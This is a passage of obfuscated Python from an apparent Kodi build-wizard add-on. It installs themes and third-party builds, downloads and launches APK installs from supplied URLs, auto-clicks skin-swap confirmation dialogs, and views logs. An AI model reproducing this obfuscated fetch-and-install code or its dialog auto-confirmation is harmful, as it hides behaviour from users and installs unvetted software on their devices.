			if url not in ["fresh","normal"]:#line:4569
				OO00OOOOOO0O00O00 =testTheme (OOO0O000O000O0O00 )if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']else False #line:4570
				O0000OOO0OO0O0000 =testGui (OOO0O000O000O0O00 )if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']else False #line:4571
				if OO00OOOOOO0O00O00 ==True :#line:4572
					wiz .lookandFeelData ('save')#line:4573
					OO0OO0OO00OOO000O ='skin.confluence'if KODIV <17 else 'skin.estuary'if KODIV <17 else 'skin.anonymous.mod'if KODIV <17 else 'skin.estouchy'if KODIV <17 else 'skin.phenomenal'if KODIV <17 else 'skin.anonymous.nox'if KODIV <17 else 'skin.Premium.mod'#line:4574
					O0OOOO000O0O0O0OO =xbmc .getSkinDir ()#line:4575
					skinSwitch .swapSkins (OO0OO0OO00OOO000O )#line:4577
					O00000OO00000OOOO =0 #line:4578
					xbmc .sleep (1000 )#line:4579
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O00000OO00000OOOO <150 :#line:4580
						O00000OO00000OOOO +=1 #line:4581
						xbmc .sleep (1000 )#line:4582
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4583
						wiz .ebi ('SendClick(11)')#line:4584
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Skin Swap Timed Out![/COLOR]'%COLOR2 );return #line:4585
					xbmc .sleep (1000 )#line:4586
			O000000OO0O00000O ='[COLOR %s][B]Installing Theme:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,theme )#line:4587
			DP .update (0 ,O000000OO0O00000O ,'','אנא המתן')#line:4588
			OO00O0O00OO00O000 ,O000O0000O0O000O0 ,O000000OOOOOOOOOO =extract .all (OOO0O000O000O0O00 ,HOME ,DP ,title =O000000OO0O00000O )#line:4589
			wiz .setS ('buildtheme',theme )#line:4590
			wiz .log ('INSTALLED %s: [שגיאות:%s]'%(OO00O0O00OO00O000 ,O000O0000O0O000O0 ))#line:4591
			DP .close ()#line:4592
			if url not in ["fresh","normal"]:#line:4593
				wiz .forceUpdate ()#line:4594
				if KODIV >=17 :wiz .kodi17Fix ()#line:4595
				if O0000OOO0OO0O0000 ==True :#line:4596
					wiz .lookandFeelData ('save')#line:4597
					wiz .defaultSkin ()#line:4598
					O0OOOO000O0O0O0OO =wiz .getS ('defaultskin')#line:4599
					skinSwitch .swapSkins (O0OOOO000O0O0O0OO )#line:4600
					O00000OO00000OOOO =0 #line:4601
					xbmc .sleep (1000 )#line:4602
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O00000OO00000OOOO <150 :#line:4603
						O00000OO00000OOOO +=1 #line:4604
						xbmc .sleep (1000 )#line:4605
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4607
						wiz .ebi ('SendClick(11)')#line:4608
					wiz .lookandFeelData ('restore')#line:4609
				elif OO00OOOOOO0O00O00 ==True :#line:4610
					skinSwitch .swapSkins (O0OOOO000O0O0O0OO )#line:4611
					O00000OO00000OOOO =0 #line:4612
					xbmc .sleep (1000 )#line:4613
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O00000OO00000OOOO <150 :#line:4614
						O00000OO00000OOOO +=1 #line:4615
						xbmc .sleep (1000 )#line:4616
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4618
						wiz .ebi ('SendClick(11)')#line:4619
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Skin Swap Timed Out![/COLOR]'%COLOR2 );return #line:4620
					wiz .lookandFeelData ('restore')#line:4621
				else :#line:4622
					wiz .ebi ("ReloadSkin()")#line:4623
					xbmc .sleep (1000 )#line:4624
					wiz .ebi ("Container.Refresh")#line:4625
		else :#line:4626
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 )#line:4627
def skin_homeselect ():#line:4631
	try :#line:4633
		OO000OO0O0OOOO000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4634
		O0OO00OOOO0OO0O00 =open (OO000OO0O0OOOO000 ,'r')#line:4636
		OO0O0OOO00OOO00O0 =O0OO00OOOO0OO0O00 .read ()#line:4637
		O0OO00OOOO0OO0O00 .close ()#line:4638
		O0000O0OO0OOOO0O0 ='<setting id="FirstRunSetup" type="bool(.+?)/setting>'#line:4639
		O0OOO000OOOO0O0O0 =re .compile (O0000O0OO0OOOO0O0 ).findall (OO0O0OOO00OOO00O0 )[0 ]#line:4640
		O0OO00OOOO0OO0O00 =open (OO000OO0O0OOOO000 ,'w')#line:4641
		O0OO00OOOO0OO0O00 .write (OO0O0OOO00OOO00O0 .replace ('<setting id="FirstRunSetup" type="bool%s/setting>'%O0OOO000OOOO0O0O0 ,'<setting id="FirstRunSetup" type="bool"></setting>'))#line:4642
		O0OO00OOOO0OO0O00 .close ()#line:4643
	except :#line:4644
		pass #line:4645
def skin_lower ():#line:4648
	OOOO00000O0OO00O0 =(ADDON .getSetting ("lower"))#line:4649
	if OOOO00000O0OO00O0 =='true':#line:4650
		try :#line:4653
			O0O00O00000OO0OO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4654
			O0O0OOO0OOO0O0O0O =open (O0O00O00000OO0OO0 ,'r')#line:4656
			O0O00000000O0O0OO =O0O0OOO0OOO0O0O0O .read ()#line:4657
			O0O0OOO0OOO0O0O0O .close ()#line:4658
			OOO0OOO00OOO00O0O ='<setting id="none_widget" type="bool(.+?)/setting>'#line:4659
			O0OO0O000O0OOO00O =re .compile (OOO0OOO00OOO00O0O ).findall (O0O00000000O0O0OO )[0 ]#line:4660
			O0O0OOO0OOO0O0O0O =open (O0O00O00000OO0OO0 ,'w')#line:4661
			O0O0OOO0OOO0O0O0O .write (O0O00000000O0O0OO .replace ('<setting id="none_widget" type="bool%s/setting>'%O0OO0O000O0OOO00O ,'<setting id="none_widget" type="bool">true</setting>'))#line:4662
			O0O0OOO0OOO0O0O0O .close ()#line:4663
		except :#line:4729
			pass #line:4730
def thirdPartyInstall (OO00O000O0O00OOO0 ,O00O0O00OO00O000O ):#line:4732
	if not wiz .workingURL (O00O0O00OO00O000O ):#line:4733
		LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Invalid URL for Build[/COLOR]'%COLOR2 );return #line:4734
	OOOO00OO0O0O0000O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to preform a [COLOR %s]Fresh Install[/COLOR] or [COLOR %s]Normal Install[/COLOR] for:[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OO00O000O0O00OOO0 ),yeslabel ="[B][COLOR green]Fresh Install[/COLOR][/B]",nolabel ="[B][COLOR red]Normal Install[/COLOR][/B]")#line:4735
	if OOOO00OO0O0O0000O ==1 :#line:4736
		freshStart ('third',True )#line:4737
	wiz .clearS ('build')#line:4738
	OOOO0O00O0000O000 =OO00O000O0O00OOO0 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4739
	if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4740
	DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO00O000O0O00OOO0 ),'','אנא המתן')#line:4741
	O00OOO00OOO0O000O =os .path .join (PACKAGES ,'%s.zip'%OOOO0O00O0000O000 )#line:4742
	try :os .remove (O00OOO00OOO0O000O )#line:4743
	except :pass #line:4744
	downloader .download (O00O0O00OO00O000O ,O00OOO00OOO0O000O ,DP )#line:4745
	xbmc .sleep (1000 )#line:4746
	O000O0O0000O00000 ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO00O000O0O00OOO0 )#line:4747
	DP .update (0 ,O000O0O0000O00000 ,'','אנא המתן')#line:4748
	OO00OO00OO00OO000 ,O0O0OO0OOO0000OOO ,O0000O0OO0OO0OO00 =extract .all (O00OOO00OOO0O000O ,HOME ,DP ,title =O000O0O0000O00000 )#line:4749
	if int (float (OO00OO00OO00OO000 ))>0 :#line:4750
		wiz .fixmetas ()#line:4751
		wiz .lookandFeelData ('save')#line:4752
		wiz .defaultSkin ()#line:4753
		wiz .setS ('installed','true')#line:4755
		wiz .setS ('extract',str (OO00OO00OO00OO000 ))#line:4756
		wiz .setS ('errors',str (O0O0OO0OOO0000OOO ))#line:4757
		wiz .log ('INSTALLED %s: [ERRORS:%s]'%(OO00OO00OO00OO000 ,O0O0OO0OOO0000OOO ))#line:4758
		try :os .remove (O00OOO00OOO0O000O )#line:4759
		except :pass #line:4760
		if int (float (O0O0OO0OOO0000OOO ))>0 :#line:4761
			O00O0O000O0O00OO0 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s][COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO00O000O0O00OOO0 ),'Completed: [COLOR %s]%s%s[/COLOR] [Errors:[COLOR %s]%s[/COLOR]]'%(COLOR1 ,OO00OO00OO00OO000 ,'%',COLOR1 ,O0O0OO0OOO0000OOO ),'האם תרצה להציג שגיאות?[/COLOR]',nolabel ='[B][COLOR red]לא תודה[/COLOR][/B]',yeslabel ='[B][COLOR green]הצג שגיאות[/COLOR][/B]')#line:4762
			if O00O0O000O0O00OO0 :#line:4763
				if isinstance (O0O0OO0OOO0000OOO ,unicode ):#line:4764
					O0000O0OO0OO0OO00 =O0000O0OO0OO0OO00 .encode ('utf-8')#line:4765
				wiz .TextBox (ADDONTITLE ,O0000O0OO0OO0OO00 )#line:4766
	DP .close ()#line:4767
	if KODIV >=17 :wiz .addonDatabase (ADDON_ID ,1 )#line:4768
	if INSTALLMETHOD ==1 :O0O0OOO00OOO000O0 =1 #line:4769
	elif INSTALLMETHOD ==2 :O0O0OOO00OOO000O0 =0 #line:4770
	else :O0O0OOO00OOO000O0 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to [COLOR %s]Force close[/COLOR] kodi or [COLOR %s]Reload Profile[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR green]Reload Profile[/COLOR][/B]",nolabel ="[B][COLOR red]Force Close[/COLOR][/B]")#line:4771
	if O0O0OOO00OOO000O0 ==1 :wiz .reloadFix ()#line:4772
	else :wiz .killxbmc (True )#line:4773
def testTheme (OO00OO00O0O00OO0O ):#line:4775
	O0O000OO00OOO0OO0 =zipfile .ZipFile (OO00OO00O0O00OO0O )#line:4776
	for OOOOO000OO00O0O0O in O0O000OO00OOO0OO0 .infolist ():#line:4777
		if '/settings.xml'in OOOOO000OO00O0O0O .filename :#line:4778
			return True #line:4779
	return False #line:4780
def testGui (O00OO0OOOOOOOO000 ):#line:4782
	O0OO0O0OOO0OOO00O =zipfile .ZipFile (O00OO0OOOOOOOO000 )#line:4783
	for O0O0O0O00OOO0OOOO in O0OO0O0OOO0OOO00O .infolist ():#line:4784
		if '/guisettings.xml'in O0O0O0O00OOO0OOOO .filename :#line:4785
			return True #line:4786
	return False #line:4787
def apkInstaller (O000OOOO0O00O00O0 ,O000OOOOO00O00000 ):#line:4789
	wiz .log (O000OOOO0O00O00O0 )#line:4790
	wiz .log (O000OOOOO00O00000 )#line:4791
	if wiz .platform ()=='android':#line:4792
		O0OO0OOOOOO0OO0OO =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]האם תרצה להוריד ולהתקין את:"%COLOR2 ,"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O000OOOO0O00O00O0 ),yeslabel ="[B][COLOR green]התקן[/COLOR][/B]",nolabel ="[B][COLOR red]ביטול[/COLOR][/B]")#line:4793
		if not O0OO0OOOOOO0OO0OO :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ERROR: Install Cancelled[/COLOR]'%COLOR2 );return #line:4794
		O00O0OO00OO0OOO0O =O000OOOO0O00O00O0 #line:4795
		if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4796
		if not wiz .workingURL (O000OOOOO00O00000 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]APK Installer: Invalid Apk Url![/COLOR]'%COLOR2 );return #line:4797
		DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00O0OO00OO0OOO0O ),'','אנא המתן')#line:4798
		OO00OO000OO000OOO =os .path .join (PACKAGES ,"%s.apk"%O000OOOO0O00O00O0 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|',''))#line:4799
		try :os .remove (OO00OO000OO000OOO )#line:4800
		except :pass #line:4801
		downloader .download (O000OOOOO00O00000 ,OO00OO000OO000OOO ,DP )#line:4802
		xbmc .sleep (100 )#line:4803
		DP .close ()#line:4804
		notify .apkInstaller (O000OOOO0O00O00O0 )#line:4805
		wiz .ebi ('StartAndroidActivity("","android.intent.action.VIEW","application/vnd.android.package-archive","file:'+OO00OO000OO000OOO +'")')#line:4806
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ERROR: None Android Device[/COLOR]'%COLOR2 )#line:4807
def createMenu (O0OO00OOOOO00O000 ,O000OO000O000OOO0 ,O0000000O000OOO0O ):#line:4813
	if O0OO00OOOOO00O000 =='saveaddon':#line:4814
		O0O00O0O0O00O00O0 =[]#line:4815
		O0O0OO00O000O00O0 =urllib .quote_plus (O000OO000O000OOO0 .lower ().replace (' ',''))#line:4816
		O0OO0OOOOOO00O0OO =O000OO000O000OOO0 .replace ('Debrid','Real Debrid')#line:4817
		OOO00OO0OO0OO0000 =urllib .quote_plus (O0000000O000OOO0O .lower ().replace (' ',''))#line:4818
		O0000000O000OOO0O =O0000000O000OOO0O .replace ('url','URL Resolver')#line:4819
		O0O00O0O0O00O00O0 .append ((THEME2 %O0000000O000OOO0O .title (),' '))#line:4820
		O0O00O0O0O00O00O0 .append ((THEME3 %'Save %s Data'%O0OO0OOOOOO00O0OO ,'RunPlugin(plugin://%s/?mode=save%s&name=%s)'%(ADDON_ID ,O0O0OO00O000O00O0 ,OOO00OO0OO0OO0000 )))#line:4821
		O0O00O0O0O00O00O0 .append ((THEME3 %'Restore %s Data'%O0OO0OOOOOO00O0OO ,'RunPlugin(plugin://%s/?mode=restore%s&name=%s)'%(ADDON_ID ,O0O0OO00O000O00O0 ,OOO00OO0OO0OO0000 )))#line:4822
		O0O00O0O0O00O00O0 .append ((THEME3 %'Clear %s Data'%O0OO0OOOOOO00O0OO ,'RunPlugin(plugin://%s/?mode=clear%s&name=%s)'%(ADDON_ID ,O0O0OO00O000O00O0 ,OOO00OO0OO0OO0000 )))#line:4823
	elif O0OO00OOOOO00O000 =='save':#line:4824
		O0O00O0O0O00O00O0 =[]#line:4825
		O0O0OO00O000O00O0 =urllib .quote_plus (O000OO000O000OOO0 .lower ().replace (' ',''))#line:4826
		O0OO0OOOOOO00O0OO =O000OO000O000OOO0 .replace ('Debrid','Real Debrid')#line:4827
		OOO00OO0OO0OO0000 =urllib .quote_plus (O0000000O000OOO0O .lower ().replace (' ',''))#line:4828
		O0000000O000OOO0O =O0000000O000OOO0O .replace ('url','URL Resolver')#line:4829
		O0O00O0O0O00O00O0 .append ((THEME2 %O0000000O000OOO0O .title (),' '))#line:4830
		O0O00O0O0O00O00O0 .append ((THEME3 %'Register %s'%O0OO0OOOOOO00O0OO ,'RunPlugin(plugin://%s/?mode=auth%s&name=%s)'%(ADDON_ID ,O0O0OO00O000O00O0 ,OOO00OO0OO0OO0000 )))#line:4831
		O0O00O0O0O00O00O0 .append ((THEME3 %'Save %s Data'%O0OO0OOOOOO00O0OO ,'RunPlugin(plugin://%s/?mode=save%s&name=%s)'%(ADDON_ID ,O0O0OO00O000O00O0 ,OOO00OO0OO0OO0000 )))#line:4832
		O0O00O0O0O00O00O0 .append ((THEME3 %'Restore %s Data'%O0OO0OOOOOO00O0OO ,'RunPlugin(plugin://%s/?mode=restore%s&name=%s)'%(ADDON_ID ,O0O0OO00O000O00O0 ,OOO00OO0OO0OO0000 )))#line:4833
		O0O00O0O0O00O00O0 .append ((THEME3 %'Import %s Data'%O0OO0OOOOOO00O0OO ,'RunPlugin(plugin://%s/?mode=import%s&name=%s)'%(ADDON_ID ,O0O0OO00O000O00O0 ,OOO00OO0OO0OO0000 )))#line:4834
		O0O00O0O0O00O00O0 .append ((THEME3 %'Clear Addon %s Data'%O0OO0OOOOOO00O0OO ,'RunPlugin(plugin://%s/?mode=addon%s&name=%s)'%(ADDON_ID ,O0O0OO00O000O00O0 ,OOO00OO0OO0OO0000 )))#line:4835
	elif O0OO00OOOOO00O000 =='install':#line:4836
		O0O00O0O0O00O00O0 =[]#line:4837
		OOO00OO0OO0OO0000 =urllib .quote_plus (O0000000O000OOO0O )#line:4838
		O0O00O0O0O00O00O0 .append ((THEME2 %O0000000O000OOO0O ,'RunAddon(%s, ?mode=viewbuild&name=%s)'%(ADDON_ID ,OOO00OO0OO0OO0000 )))#line:4839
		O0O00O0O0O00O00O0 .append ((THEME3 %'Fresh Install','RunPlugin(plugin://%s/?mode=install&name=%s&url=fresh)'%(ADDON_ID ,OOO00OO0OO0OO0000 )))#line:4840
		O0O00O0O0O00O00O0 .append ((THEME3 %'Normal Install','RunPlugin(plugin://%s/?mode=install&name=%s&url=normal)'%(ADDON_ID ,OOO00OO0OO0OO0000 )))#line:4841
		O0O00O0O0O00O00O0 .append ((THEME3 %'Apply guiFix','RunPlugin(plugin://%s/?mode=install&name=%s&url=gui)'%(ADDON_ID ,OOO00OO0OO0OO0000 )))#line:4842
		O0O00O0O0O00O00O0 .append ((THEME3 %'Build Information','RunPlugin(plugin://%s/?mode=buildinfo&name=%s)'%(ADDON_ID ,OOO00OO0OO0OO0000 )))#line:4843
	O0O00O0O0O00O00O0 .append ((THEME2 %'%s Settings'%ADDONTITLE ,'RunPlugin(plugin://%s/?mode=settings)'%ADDON_ID ))#line:4844
	return O0O00O0O0O00O00O0 #line:4845
def toggleCache (OO00OO000OOO0O000 ):#line:4847
	OOOOO0OOO000OOOO0 =['includevideo','includeall','includebob','includephoenix','includespecto','includegenesis','includeexodus','includeonechan','includesalts','includesaltslite']#line:4848
	OOOOOO00O00000OO0 =['Include Video Addons','Include All Addons','Include Bob','Include Phoenix','Include Specto','Include Genesis','Include Exodus','Include One Channel','Include Salts','Include Salts Lite HD']#line:4849
	if OO00OO000OOO0O000 in ['true','false']:#line:4850
		for O000OO0OOOOO0OO0O in OOOOO0OOO000OOOO0 :#line:4851
			wiz .setS (O000OO0OOOOO0OO0O ,OO00OO000OOO0O000 )#line:4852
	else :#line:4853
		if not OO00OO000OOO0O000 in ['includevideo','includeall']and wiz .getS ('includeall')=='true':#line:4854
			try :#line:4855
				O000OO0OOOOO0OO0O =OOOOOO00O00000OO0 [OOOOO0OOO000OOOO0 .index (OO00OO000OOO0O000 )]#line:4856
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]You will need to turn off [COLOR %s]Include All Addons[/COLOR] to disable[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ,O000OO0OOOOO0OO0O ))#line:4857
			except :#line:4858
				wiz .LogNotify ("[COLOR %s]Toggle Cache[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid id: %s[/COLOR]"%(COLOR2 ,OO00OO000OOO0O000 ))#line:4859
		else :#line:4860
			O00O0OOOO00O0O0OO ='true'if wiz .getS (OO00OO000OOO0O000 )=='false'else 'false'#line:4861
			wiz .setS (OO00OO000OOO0O000 ,O00O0OOOO00O0O0OO )#line:4862
def playVideo (O0O000000O00O0O0O ):#line:4864
	wiz .log ("YouTube CCCCCCCCCCCCCCCCCCCCCCCCCCC URL: %s"%O0O000000O00O0O0O )#line:4865
	if 'watch?v='in O0O000000O00O0O0O :#line:4866
		OO0O0O0O0OOO0OO00 ,O00O0000O0O00OOO0 =O0O000000O00O0O0O .split ('?')#line:4867
		O0O0O0OO0OO0O0O00 =O00O0000O0O00OOO0 .split ('&')#line:4868
		for OOO0O000O000OOO00 in O0O0O0OO0OO0O0O00 :#line:4869
			if OOO0O000O000OOO00 .startswith ('v='):#line:4870
				O0O000000O00O0O0O =OOO0O000O000OOO00 [2 :]#line:4871
				break #line:4872
			else :continue #line:4873
	elif 'embed'in O0O000000O00O0O0O or 'youtu.be'in O0O000000O00O0O0O :#line:4874
		wiz .log ("YouTube BBBBBBBBBBBBBBBBBBBBBBBBB URL: %s"%O0O000000O00O0O0O )#line:4875
		OO0O0O0O0OOO0OO00 =O0O000000O00O0O0O .split ('/')#line:4876
		if len (OO0O0O0O0OOO0OO00 [-1 ])>5 :#line:4877
			O0O000000O00O0O0O =OO0O0O0O0OOO0OO00 [-1 ]#line:4878
		elif len (OO0O0O0O0OOO0OO00 [-2 ])>5 :#line:4879
			O0O000000O00O0O0O =OO0O0O0O0OOO0OO00 [-2 ]#line:4880
	wiz .log ("YouTube URL: %s"%O0O000000O00O0O0O )#line:4881
	yt .PlayVideo (O0O000000O00O0O0O )#line:4882
def viewLogFile ():#line:4884
	O0O00OOO000OO0O0O =wiz .Grab_Log (True )#line:4885
	OOO000OOOO0O00OOO =wiz .Grab_Log (True ,True )#line:4886
	OO000O00O00O00OOO =0 ;O000OOO0OOOO00OO0 =O0O00OOO000OO0O0O #line:4887
	if not OOO000OOOO0O00OOO ==False and not O0O00OOO000OO0O0O ==False :#line:4888
		OO000O00O00O00OOO =DIALOG .select (ADDONTITLE ,["View %s"%O0O00OOO000OO0O0O .replace (LOG ,""),"View %s"%OOO000OOOO0O00OOO .replace (LOG ,"")])#line:4889
		if OO000O00O00O00OOO ==-1 :wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]View Log Cancelled![/COLOR]'%COLOR2 );return #line:4890
	elif O0O00OOO000OO0O0O ==False and OOO000OOOO0O00OOO ==False :#line:4891
		wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]No Log File Found![/COLOR]'%COLOR2 )#line:4892
		return #line:4893
	elif not O0O00OOO000OO0O0O ==False :OO000O00O00O00OOO =0 #line:4894
	elif not OOO000OOOO0O00OOO ==False :OO000O00O00O00OOO =1 #line:4895
	O000OOO0OOOO00OO0 =O0O00OOO000OO0O0O if OO000O00O00O00OOO ==0 else OOO000OOOO0O00OOO #line:4897
	OOO0O0O0OOO00OO0O =wiz .Grab_Log (False )if OO000O00O00O00OOO ==0 else wiz .Grab_Log (False ,True )#line:4898
	wiz .TextBox ("%s - %s"%(ADDONTITLE ,O000OOO0OOOO00OO0 ),OOO0O0O0OOO00OO0O )#line:4900
def errorChecking (log =None ,count =None ,all =None ):#line:4902
	if log ==None :#line:4903
		O0O0O0000OO0OOO0O =wiz .Grab_Log (True )#line:4904
		OOOOO0O0OOO00O00O =wiz .Grab_Log (True ,True )#line:4905
		if not OOOOO0O0OOO00O00O ==False and not O0O0O0000OO0OOO0O ==False :#line:4906
			O000O0OOOO0OOO00O =DIALOG .select (ADDONTITLE ,["View %s: %s error(s)"%(O0O0O0000OO0OOO0O .replace (LOG ,""),errorChecking (O0O0O0000OO0OOO0O ,True ,True )),"View %s: %s error(s)"%(OOOOO0O0OOO00O00O .replace (LOG ,""),errorChecking (OOOOO0O0OOO00O00O ,True ,True ))])#line:4907
			if O000O0OOOO0OOO00O ==-1 :wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]View Log Cancelled![/COLOR]'%COLOR2 );return #line:4908
		elif O0O0O0000OO0OOO0O ==False and OOOOO0O0OOO00O00O ==False :#line:4909
			wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]No Log File Found![/COLOR]'%COLOR2 )#line:4910
			return #line:4911
		elif not O0O0O0000OO0OOO0O ==False :O000O0OOOO0OOO00O =0 #line:4912
		elif not OOOOO0O0OOO00O00O ==False :O000O0OOOO0OOO00O =1 #line:4913
		log =O0O0O0000OO0OOO0O if O000O0OOOO0OOO00O ==0 else OOOOO0O0OOO00O00O #line:4914
	if log ==False :#line:4915
		if count ==None :#line:4916
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Log File not Found[/COLOR]"%COLOR2 )#line:4917
			return False #line:4918
		else :#line:4919
			return 0 #line:4920
	else :#line:4921
		if os .path .exists (log ):#line:4922
			O0OOO0OOOOO000O0O =open (log ,mode ='r');OOOO0000O000O0000 =O0OOO0OOOOO000O0O .read ().replace ('\n','').replace ('\r','');O0OOO0OOOOO000O0O .close ()#line:4923
			OO00O0O0O0O0OO0O0 =re .compile ("-->Python callback/script returned the following error<--(.+?)-->End of Python script error report<--").findall (OOOO0000O000O0000 )#line:4924
			if not count ==None :#line:4925
				if all ==None :#line:4926
					O0OO0000O00O00O00 =0 #line:4927
					for OO0OOOOOOO00O0O00 in OO00O0O0O0O0OO0O0 :#line:4928
						if ADDON_ID in OO0OOOOOOO00O0O00 :O0OO0000O00O00O00 +=1 #line:4929
					return O0OO0000O00O00O00 #line:4930
				else :return len (OO00O0O0O0O0OO0O0 )#line:4931
			if len (OO00O0O0O0O0OO0O0 )>0 :#line:4932
				O0OO0000O00O00O00 =0 ;O0OOO0O00OOOOOO0O =""#line:4933
				for OO0OOOOOOO00O0O00 in OO00O0O0O0O0OO0O0 :#line:4934
					if all ==None and not ADDON_ID in OO0OOOOOOO00O0O00 :continue #line:4935
					else :#line:4936
						O0OO0000O00O00O00 +=1 #line:4937
						O0OOO0O00OOOOOO0O +="[COLOR red]Error Number %s[/COLOR]\n(PythonToCppException) : -->Python callback/script returned the following error<--%s-->End of Python script error report<--\n\n"%(O0OO0000O00O00O00 ,OO0OOOOOOO00O0O00 .replace ('                                          ','\n').replace ('\\\\','\\').replace (HOME ,''))#line:4938
				if O0OO0000O00O00O00 >0 :#line:4939
					wiz .TextBox (ADDONTITLE ,O0OOO0O00OOOOOO0O )#line:4940
				else :wiz .LogNotify (ADDONTITLE ,"No Errors Found in Log")#line:4941
			else :wiz .LogNotify (ADDONTITLE ,"No Errors Found in Log")#line:4942
		else :wiz .LogNotify (ADDONTITLE ,"Log File not Found")#line:4943
ACTION_PREVIOUS_MENU =10 #line:4945
ACTION_NAV_BACK =92 #line:4946
ACTION_MOVE_LEFT =1 #line:4947
ACTION_MOVE_RIGHT =2 #line:4948
ACTION_MOVE_UP =3 #line:4949
ACTION_MOVE_DOWN =4 #line:4950
ACTION_MOUSE_WHEEL_UP =104 #line:4951
ACTION_MOUSE_WHEEL_DOWN =105 #line:4952
ACTION_MOVE_MOUSE =107 #line:4953
ACTION_SELECT_ITEM =7 #line:4954
ACTION_BACKSPACE =110 #line:4955
ACTION_MOUSE_LEFT_CLICK =100 #line:4956
ACTION_MOUSE_LONG_CLICK =108 #line:4957
def LogViewer (default =None ):#line:4959
	class O00O0O0OOOOO000OO (xbmcgui .WindowXMLDialog ):#line:4960
		def __init__ (O000O000O0OO000OO ,*O00OOO000O0O00000 ,**OOOOOOOOOOO000OOO ):#line:4961
			O000O000O0OO000OO .default =OOOOOOOOOOO000OOO ['default']#line:4962
		def onInit (OOO000OO000OO0O0O ):#line:4964
			OOO000OO000OO0O0O .title =101 #line:4965
			OOO000OO000OO0O0O .msg =102 #line:4966
			OOO000OO000OO0O0O .scrollbar =103 #line:4967
			OOO000OO000OO0O0O .upload =201 #line:4968
			OOO000OO000OO0O0O .kodi =202 #line:4969
			OOO000OO000OO0O0O .kodiold =203 #line:4970
			OOO000OO000OO0O0O .wizard =204 #line:4971
			OOO000OO000OO0O0O .okbutton =205 #line:4972
			OOOO0000OOO0OOOO0 =open (OOO000OO000OO0O0O .default ,'r')#line:4973
			OOO000OO000OO0O0O .logmsg =OOOO0000OOO0OOOO0 .read ()#line:4974
			OOOO0000OOO0OOOO0 .close ()#line:4975
			OOO000OO000OO0O0O .titlemsg ="%s: %s"%(ADDONTITLE ,OOO000OO000OO0O0O .default .replace (LOG ,'').replace (ADDONDATA ,''))#line:4976
			OOO000OO000OO0O0O .showdialog ()#line:4977
		def showdialog (OO00OO0OO0OOOO00O ):#line:4979
			OO00OO0OO0OOOO00O .getControl (OO00OO0OO0OOOO00O .title ).setLabel (OO00OO0OO0OOOO00O .titlemsg )#line:4980
			OO00OO0OO0OOOO00O .getControl (OO00OO0OO0OOOO00O .msg ).setText (wiz .highlightText (OO00OO0OO0OOOO00O .logmsg ))#line:4981
			OO00OO0OO0OOOO00O .setFocusId (OO00OO0OO0OOOO00O .scrollbar )#line:4982
		def onClick (OOOO0O0O00OOO0000 ,O0O000O0OOO000OO0 ):#line:4984
			if O0O000O0OOO000OO0 ==OOOO0O0O00OOO0000 .okbutton :OOOO0O0O00OOO0000 .close ()#line:4985
